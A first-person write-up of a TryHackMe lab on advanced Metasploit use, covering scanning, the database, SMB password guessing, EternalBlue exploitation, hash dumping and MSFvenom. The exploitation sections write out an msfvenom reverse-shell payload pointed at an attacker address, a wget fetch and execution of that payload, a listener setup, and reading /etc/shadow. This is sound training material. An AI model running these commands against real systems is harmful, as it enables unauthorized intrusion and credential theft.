# Metasploit Advanced Features and Exploitation

## Introduction

I used this TryHackMe room to continue learning Metasploit after studying the basic Metasploit functionality in the Metasploit Introduction room. The focus here was on using Metasploit for more advanced scanning, working with its database, identifying potential vulnerabilities, exploiting a vulnerable Windows system, and using MSFvenom to create a payload and establish a Meterpreter session.

This was still a guided learning exercise rather than a professional penetration test. I followed the room's examples and practiced the commands in the lab environment. My main goal was to understand how the different parts of Metasploit fit together instead of simply memorizing the answers to the room questions.

## Metasploit and the MSF Console

Metasploit is a penetration testing framework that contains modules for scanning, service enumeration, exploitation, payload handling, and other security testing tasks. I interacted with the framework mainly through `msfconsole`.

One of the most important things I reinforced was the idea that Metasploit is organized around modules. Searching for a capability normally involves the `search` command, selecting a module with `use`, checking its configuration with `show options`, setting required values, and then running the module.

A typical workflow looks like this:

```text
search <term>
use <module>
show options
set RHOSTS <target>
run
```

The exact options depend on the module. I therefore learned not to assume that every module has the same configuration requirements.

## Port Scanning with Metasploit

I learned that Metasploit contains auxiliary scanner modules that can perform port scanning. Searching for `port scan` can reveal the available port-scanning modules.

The TCP port scanner was one of the examples used in the room. The important configuration values included `RHOSTS`, which identifies the target or targets, and the port-related option, which controls which ports are scanned. The exact option name can vary between scanner modules, so I learned to use `show options` rather than relying on memory.

`RHOSTS` can represent an individual target or multiple targets. In a controlled lab such as TryHackMe, I was usually working with one target IP address.

Metasploit's TCP scanner can be useful when I specifically want to stay inside the framework, but I also learned that Nmap is generally more convenient for broad reconnaissance and service enumeration.

## Running Nmap from Metasploit

One feature I found particularly useful was the ability to run Nmap from the Metasploit console. I used an Nmap command with service and version detection:

```text
nmap -sV <target>
```

The `-sV` option tells Nmap to probe discovered services and attempt to identify the applications and their versions. This gave me more useful information than simply knowing that a port was open.

The room explained that using Nmap can be more efficient than moving through several individual Metasploit scanner modules when I need a broad view of a target. I found this useful because the scan could show the open ports, services, and version information in one result.

I learned that Metasploit is not necessarily the tool I need to use for every stage of reconnaissance. Metasploit's scanner modules are useful when I need a specific type of information, while Nmap is often more convenient for initial enumeration.

## UDP Scanning

I also learned that scanning should not be limited to TCP. Metasploit provides UDP scanner modules that can help identify services operating over UDP.

UDP is different from TCP because it is connectionless and does not establish a TCP-style connection before communication. As a result, UDP scanning requires different techniques from TCP scanning. I learned that Metasploit can support both types of scanning, depending on what I am trying to identify.

The important lesson for me was that a target can expose useful services through either protocol, so checking only TCP can leave part of the attack surface unexplored.

## SMB and NetBIOS Enumeration

The room also introduced SMB scanning. SMB stands for Server Message Block and is commonly used for file and printer sharing, although it supports other functionality as well.

I learned that Metasploit has different SMB-related scanner modules for different types of information. One module can help identify the SMB version, while another can enumerate available shares. Other SMB-related modules can provide additional information such as users or authentication-related details.

I also encountered NetBIOS enumeration. NetBIOS and SMB are closely associated technologies in many Windows networking environments, but they are not the same thing. The room used NetBIOS scanning to identify information such as the NetBIOS name of the target.

The important lesson was that the word `SMB` in a Metasploit search does not automatically mean that one module performs every type of SMB enumeration. I need to identify the specific module that provides the information I am looking for.

## Using Metasploit Modules for Service Enumeration

I practiced the general process of finding a specific scanner by searching for a relevant term, selecting the appropriate module, viewing its options, setting the target, and running it.

For example, I used an HTTP version detection module to identify the service running on a non-standard HTTP port. The workflow was based on selecting the module first and then configuring its target and port.

The module configuration followed this pattern:

```text
search http version
use <module>
show options
set RHOSTS <target>
set RPORT 8000
run
```

The exact module number can change between Metasploit versions, so I learned that the module name and description are more reliable than memorizing a numerical index.

The lab target exposed an HTTP service on port `8000`, and the enumeration identified it as WebFS version `1.21`.

## Dictionary-Based SMB Authentication Testing

I also used an SMB login module to test a username against a supplied password wordlist. The purpose of this exercise was to understand how Metasploit can automate repeated authentication attempts in a controlled lab.

The important distinction I learned was between a password file and a combined username-password file. The module has separate options for these different input types. In this exercise, I already knew the username was `Penny`, so I used the provided wordlist as the password source.

The relevant configuration concept was:

```text
set RHOSTS <target>
set SMBUser Penny
set PASS_FILE <wordlist>
run
```

The module tried the passwords from the supplied wordlist against the specified SMB account. The successful laboratory credential was identified as `Leo1234`.

This exercise helped me understand how dictionary-based authentication testing works. It also reinforced that the input options need to match the information I actually have. If I already know a username, I do not need a username wordlist for that particular test.

## The Metasploit Database

Another major part of the room was the Metasploit database. I learned that Metasploit can use a PostgreSQL database to store information collected during security testing.

The database can be initialized before starting Metasploit with commands such as:

```text
systemctl start postgresql
msfdb init
```

After starting `msfconsole`, I can check the database connection with:

```text
db_status
```

The database can retain information such as discovered hosts, services, and other information gathered during enumeration. This is useful because I do not have to rely entirely on memory or repeatedly perform the same scans just to remember what I previously discovered.

The database becomes especially useful during a longer assessment where information is collected over multiple stages.

## Metasploit Workspaces

I learned that Metasploit workspaces provide a way to separate information belonging to different targets or assessments.

The default workspace is normally available when the database is configured. I can create another workspace with:

```text
workspace -a TryHackMe
```

I can display the available workspaces with:

```text
workspace
```

The currently selected workspace is marked with an asterisk. I can switch to another workspace by providing its name:

```text
workspace default
```

I can also delete a workspace with:

```text
workspace -d TryHackMe
```

The main reason I found workspaces useful is organization. If I were working with multiple authorized targets, keeping their hosts, services, and other collected information separated would reduce the chance of mixing information from different environments.

## Saving Nmap Results in the Metasploit Database

I learned an important distinction between running ordinary Nmap and using the Metasploit database-aware Nmap command.

The database-aware form is:

```text
db_nmap -sV <target>
```

Using `db_nmap` allows the scan results to be imported into the Metasploit database associated with the current workspace. Simply running `nmap` from the shell does not provide the same database integration.

After collecting information, I can use commands such as:

```text
hosts
services
```

The `hosts` command shows hosts known to the database, while `services` shows services associated with those hosts.

I can also search the stored services for a particular term. For example:

```text
services -s <service>
```

This becomes useful when a database contains information from many hosts and I want to narrow the results to systems exposing a particular service.

## Using Stored Hosts as RHOSTS

Another database feature I learned was the ability to use stored hosts as the `RHOSTS` value.

The command:

```text
hosts -R
```

can populate the `RHOSTS` option from hosts stored in the current workspace when used in the appropriate module context.

This is useful when working with multiple authorized systems because I do not have to manually type every target address into a module. It also demonstrates why keeping the correct workspace selected matters.

## Understanding Vulnerability Scanning in This Room

The room describes one section as vulnerability scanning, but I learned that it was not a complete vulnerability assessment in the same sense as a dedicated vulnerability scanner.

The exercise was more focused on identifying services and then looking for Metasploit modules that could test specific weaknesses. This is closer to a workflow of reconnaissance, service identification, module discovery, and targeted vulnerability testing.

For example, if I identify a service such as VNC or SMTP, I can search Metasploit for modules related to that service and investigate whether a module can test a particular condition.

This distinction is important because finding an exploit module for a service does not mean that the entire target has been comprehensively scanned for vulnerabilities.

## Finding Modules with Search and Inspecting Them with Info

I practiced using the `search` command to locate modules related to a particular protocol or vulnerability.

One example involved SMTP. I searched for SMTP-related modules and looked for the module associated with SMTP open relay detection.

After finding the relevant module, I used the `info` command to inspect it. The information displayed by a module can include its description, references, options, and author information.

The SMTP open relay detection module used in the room was identified as being written by `xistence`.

The important lesson for me was that I do not need to know every Metasploit module from memory. I can search for a capability, inspect the results, and then use the module information to understand what it does before running it.

## Exploitation with Metasploit

The exploitation section moved from enumeration into actually exploiting a vulnerable Windows target. The example used the MS17-010 vulnerability commonly associated with EternalBlue.

I searched for the relevant Metasploit module and selected it. After entering the module, I used `show options` to identify the required configuration.

The basic workflow was:

```text
search MS17-010
use <EternalBlue module>
show options
set RHOSTS <target>
run
```

The exact module number should not be memorized because module numbering can change between Metasploit versions. The module name and search results are more reliable.

The exploit produced a Meterpreter session on the vulnerable Windows target. This was an important practical step because it demonstrated the relationship between an exploit and a payload. The exploit is responsible for taking advantage of the vulnerability, while the payload determines what happens after successful exploitation.

## Payloads and Meterpreter

I learned that Metasploit can use different payloads with an exploit. A Meterpreter payload provides an interactive session designed to work closely with Metasploit.

I also learned that Meterpreter is not the same thing as a normal command shell. It provides its own command set and functionality that can be used after obtaining a session.

The payload can be inspected or changed with commands such as:

```text
show payloads
set payload <payload>
```

The available payloads depend on the exploit and target platform. In the room, a Meterpreter reverse TCP payload was used because it provided a useful interactive session.

## Managing Metasploit Sessions

After obtaining a session, I learned that Metasploit can keep the session available while returning me to the main console.

I can list existing sessions with:

```text
sessions
```

I can interact with a particular session using its session ID:

```text
sessions -i <session_id>
```

A session can also be backgrounded. With a Meterpreter session, the `background` command can return me to the Metasploit console while keeping the session available.

I also learned that `Ctrl-Z` can be used to background a session and `Ctrl-C` can terminate the current session or operation depending on the context. I need to pay attention to which interface I am currently interacting with rather than assuming every control sequence has identical behavior everywhere.

If many unwanted sessions are created, Metasploit provides session management options that can be used to clean them up. During the lab, an exploit unexpectedly created multiple sessions, so I had to remove the unwanted sessions before continuing.

## Searching Files Through Meterpreter

After obtaining the Windows Meterpreter session, I used Meterpreter's file search functionality to locate a `flag.txt` file.

The command I used was:

```text
search -f flag.txt
```

The `-f` option specifies a file name search. The result provided the location of the file, which I could then access from the Meterpreter session.

This helped me understand that a post-exploitation session is not only about obtaining access. Once the session exists, I can use the capabilities available through that session to navigate the target and locate information relevant to the authorized lab objective.

## Dumping Windows Password Hashes

The Windows exploitation exercise also introduced password hash extraction through Meterpreter.

I used:

```text
hashdump
```

The command dumps password hashes from the Windows Security Account Manager database when the session has sufficient privileges.

The output contains Windows account information and password hash material. I used the output to identify the NTLM hash associated with the `pirate` account.

I learned that the hashdump output contains multiple colon-separated fields, so I should not assume that every field is the password hash itself. The structure needs to be interpreted correctly before extracting the relevant value.

## MSFvenom

The final major practical section introduced MSFvenom. MSFvenom is a Metasploit component that can generate payloads in different formats for different target platforms.

I learned that payload generation and payload handling are separate parts of the process. Creating a payload does not automatically establish a session. The target must execute the payload, and for a reverse connection I also need a listener or handler waiting for the connection.

I can view available payloads with:

```text
msfvenom -l payloads
```

The payload naming convention often provides information about the target platform, architecture, session type, and communication method. For example, the room used a Linux Meterpreter reverse TCP payload.

A basic payload-generation example from the practical exercise was conceptually structured like this:

```text
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf
```

Here, `-p` specifies the payload, `LHOST` identifies the attacker's listening address for a reverse connection, `LPORT` specifies the listening port, `-f` specifies the output format, and `-o` specifies the output file.

The generated file in my practical exercise was an ELF executable because the target system was Linux.

## Transferring and Executing the Payload

In the lab, I generated the payload on my attacking machine and then transferred it to the target machine.

I used Python's built-in HTTP server to make the file available:

```text
python3 -m http.server 8000
```

The target machine could then retrieve the file with `wget`:

```text
wget http://<attacker_ip>:8000/shell.elf
```

I then made the file executable:

```text
chmod 777 shell.elf
```

The room used `777` for simplicity in the lab. This grants read, write, and execute permissions to the owner, group, and others. In a real environment, granting full permissions to everyone would generally be unnecessarily broad. The important part of this exercise was making the payload executable so that the target could run it.

## Setting Up a Metasploit Handler

Before executing a reverse shell payload, I needed a handler on my attacking machine to receive the incoming connection.

I searched for the handler module and selected it:

```text
search multi/handler
use <multi/handler>
show options
```

I then configured the listening host and port to match the values used when generating the payload.

The handler payload also needed to match the payload generated by MSFvenom. In this exercise, the payload was:

```text
linux/x86/meterpreter/reverse_tcp
```

The important relationship I learned was that the generated payload and the handler need compatible settings. If the payload is configured to connect back to a particular host and port, the handler needs to listen appropriately for that connection.

Once the handler was running, it waited for the target to execute the payload.

## Obtaining a Linux Meterpreter Session

After transferring the payload to the target and making it executable, I executed it on the target while the handler was listening.

The reverse connection resulted in a Meterpreter session. This was useful because I could see the difference between the original SSH access I had used to reach the lab machine and the new Meterpreter connection established through the generated payload.

The practical workflow helped me understand the full relationship between the attacking machine, the generated payload, the target machine, and the handler. The attacking machine generated the payload and hosted the file. The target retrieved and executed the payload. The payload then initiated a reverse connection back to the attacking machine, where the Metasploit handler accepted it and created the Meterpreter session.

## Linux Password Hashes

Because the final target in the MSFvenom exercise was Linux, the Windows `hashdump` command from the earlier exercise was not applicable.

Instead, I navigated to the Linux `/etc` directory and examined the shadow password file:

```text
cd /etc
cat shadow
```

The `/etc/shadow` file contains protected password hash information on Linux systems. Access to it normally requires appropriate privileges.

The room asked me to identify the password hash associated with another user, `claire`. The value shown in the lab included the complete shadow entry, including the fields separated by colons.

This was a useful correction to my earlier Windows workflow. The method for obtaining password hash information depends on the operating system and its authentication system. Windows and Linux do not use the same password database or the same hash-dumping procedure.

## Important Relationships I Learned

The main thing I took from this room is that Metasploit is not a single command or a single exploitation tool. It is a framework where reconnaissance, module selection, exploitation, payloads, handlers, sessions, and stored information can work together.

The general process I practiced started with identifying a target and enumerating its exposed services. I could use Nmap for broad service discovery or Metasploit scanner modules for more focused enumeration. The results could then be stored in the Metasploit database and organized through workspaces.

Once I knew what services and versions were present, I could search for relevant Metasploit modules. The `info` command helped me understand what a module was designed to do before using it. If a suitable exploit existed for the vulnerable lab service, I could configure the target and payload and attempt exploitation.

After successful exploitation, Metasploit managed the resulting session. Meterpreter provided additional functionality for interacting with the compromised lab system. In a separate workflow, MSFvenom allowed me to generate a payload, while `multi/handler` provided the listener required to receive a reverse connection.

Understanding these relationships is more useful to me than memorizing individual commands because the exact module, target, payload, or option can change from one lab to another.

## Practical Limitations and Lessons

Some of the material in this room was difficult because several concepts had to be understood at the same time. The MSFvenom section in particular required me to keep track of the attacking machine, target machine, payload, IP addresses, listening port, file transfer, file permissions, handler, and resulting Meterpreter session.

I also noticed how easy it is to confuse the target machine with the attacking machine when working across several terminals. Keeping track of which machine is executing each command is therefore important.

Another lesson was that exploit behavior is not always perfectly predictable. During the Windows exploitation exercise, the exploit created multiple sessions unexpectedly, so I had to clean up the extra sessions before continuing. This showed me that I need to inspect the actual state of Metasploit rather than assuming that every command will produce exactly one clean result.

I also learned not to treat every Metasploit section described as a scanner or vulnerability scanner as a complete security assessment. A targeted module can test a particular service or weakness, but that is different from comprehensive vulnerability management or a full vulnerability scan.

## What I Can Now Explain

After completing this material, I can explain how Metasploit scanner modules are selected and configured, how Nmap can be run from the Metasploit console, and how service and version information can be collected.

I can explain the purpose of the Metasploit PostgreSQL database, how workspaces separate stored information, and how `db_nmap`, `hosts`, and `services` can be used to work with stored reconnaissance data.

I can also explain the basic relationship between an exploit, a payload, a handler, and a session. I practiced exploiting a vulnerable Windows lab target and interacting with the resulting Meterpreter session. I also practiced generating a Linux Meterpreter reverse TCP payload with MSFvenom, transferring it to the lab target, configuring a matching handler, and obtaining a Meterpreter session.

I am still treating this as guided learning rather than claiming independent professional exploitation experience. The room gave me practical exposure to the workflow and the commands, but I need more repetition with different targets and scenarios before these processes become natural.

## Conclusion

This room extended my understanding of Metasploit beyond the basic `msfconsole` workflow. I learned how scanning, database management, module discovery, exploitation, payload generation, handlers, and sessions fit together.

The most useful part for me was seeing the complete chain from reconnaissance to exploitation and then from payload generation to a reverse Meterpreter connection. I also learned that Nmap and Metasploit can complement each other instead of treating Metasploit as the only tool I should use.

The room gave me a stronger foundation for understanding Metasploit in controlled cybersecurity labs. My next step is to continue practicing these concepts so that I can recognize the workflow without relying entirely on a guided walkthrough.
